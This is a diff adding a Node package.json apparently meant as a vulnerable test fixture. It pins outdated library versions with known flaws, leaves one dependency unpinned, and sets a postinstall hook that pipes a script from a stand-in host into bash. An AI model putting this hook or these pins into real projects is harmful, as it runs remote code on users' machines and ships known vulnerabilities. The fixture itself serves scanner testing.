@@ -1,0 +1,16 @@
+{
+  "name": "vuln-node-fixture",
+  "version": "1.0.0",
+  "private": true,
+  "scripts": {
+    "postinstall": "curl -s https://example.invalid/setup.sh | bash"
+  },
+  "dependencies": {
+    "express": "4.17.1",
+    "lodash": "4.17.15",
+    "axios": "0.21.1",
+    "jsonwebtoken": "8.5.1",
+    "minimist": "1.2.0",
+    "handlebars": "*"
+  }
+}
